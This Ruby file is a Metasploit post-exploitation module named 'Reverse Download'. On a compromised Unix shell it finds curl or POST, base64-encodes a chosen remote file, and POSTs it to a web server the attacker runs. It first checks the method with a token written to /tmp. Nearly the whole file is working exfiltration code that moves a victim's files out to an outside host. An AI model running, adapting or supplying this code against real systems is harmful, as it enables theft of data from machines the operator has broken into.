##
# Advanced Post Exploitation
#
# BUG:
#		Files >60 MB cannot be downloaded
#
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/unix/commands'

require 'msf/core/exploit/http/server'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  # include Msf::Post::Staekka::File
  include Msf::Post::Unix::Commands
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Reverse Download',
                      'Description'   => %q{(fast) downloading files using a local web server},
                      'Author'        => [ 'jot'],
                      'SessionTypes'  => [ 'shell' ]))
    register_options(
      [
        OptString.new('LFILE',  [ true, 'Local file name']),
        OptString.new('RFILE',  [ true, 'Remote file or directory']),
        OptString.new('SRVHOST',  [ true, 'The local host to listen on. This must be an address on the local machine' ]),
        OptString.new('SRVPORT',  [ true, 'The local port'])
      ], self.class
    )

    @post_data = nil
  end

  def run
    cmd = find_upload_tool
    raise "Cannot find a tool for uploading files" if cmd.nil?
    remote_file = datastore['RFILE']
    local_file  = datastore['LFILE']
    upload(remote_file, local_file, cmd)
  end

  def find_upload_tool
    if  session.methods.include? :cache
      if session.cache.exists?("upload_cmd")
        command = session.cache.read("upload_cmd")
        vprint_status("already found a command for : #{command}")
        return command
      end
    end

    download_tools = {
      'curl' =>	%q(curl -k -f -d @- '__URL__' ),
      'POST' =>	%q(POST -t 15 '__URL__' )
    }
    download_tools.each_pair do |_tool, cmd|
      # if installed? tool
      # next unless true
      command = can_upload?(cmd)
      if command
        vprint_status("Upload command: #{command}")
        return command
      end
    end
    nil
  end

  def can_upload?(cmd)
    base64_command = find_base64_command
    raise "Cannot find a base64 encoding command" if base64_command.nil?
    upload_cmd = base64_command + '|' + cmd

    test_token = token = ::Rex::Text.rand_text_alpha(12)
    @htdoc = test_token
    tmp_file = "/tmp/" + ::Rex::Text.rand_text_alpha(12)
    session.shell_command_token("echo #{token} > #{tmp_file}")

    path = random_uri
    cmd = base64_command + '|' + cmd

    downloaded = start_webserver(path, cmd, tmp_file).to_s
    if downloaded == test_token
      session.cache.add("download_cmd", upload_cmd) if  session.methods.include? :cache
      upload_cmd
    else
      nil
    end
  end

  def upload(remote_file, local_file, cmd)
    path = random_uri
    # cmd = base64_command + '|' + cmd
    downloaded = start_webserver(path, cmd, remote_file).to_s
    ::File.open(local_file, "wb") do |fd|
      fd.write downloaded
    end
  end

  def on_request_uri(cli, req)
    fake = "HTTP/1.1 404 Not Found\r\n\r\n"
    # print_debug("on_request_uri called: #{req.inspect}")
    data = req.to_s.match(/\r\n\r\n(.*)/)[1]
    send_response(cli, fake)
    @post_data = Rex::Text.decode_base64(data).chomp
    @request_done = true
  end

  def start_webserver(path, cmd, file)
    server_host = datastore['SRVHOST']
    server_port = datastore['SRVPORT'].to_s
    if datastore['SSL'] == true
      scheme = 'https://'
    else
      scheme = 'http://'
    end
    download_url = scheme + server_host + ':' + server_port + path
    cmd = cmd.gsub('__READ_FILE__', file)
    cmd = cmd.gsub('__URL__', download_url)

    @request_done = false
    start_service('Uri' => {
                    'Proc' => proc do |cli, req|
                      on_request_uri(cli, req)
                    end,
                    'Path' => path
                  })
    out = cmd_exec(cmd)
    # vprint_status("Webserver debug: #{out}")
    @post_data
  end
end
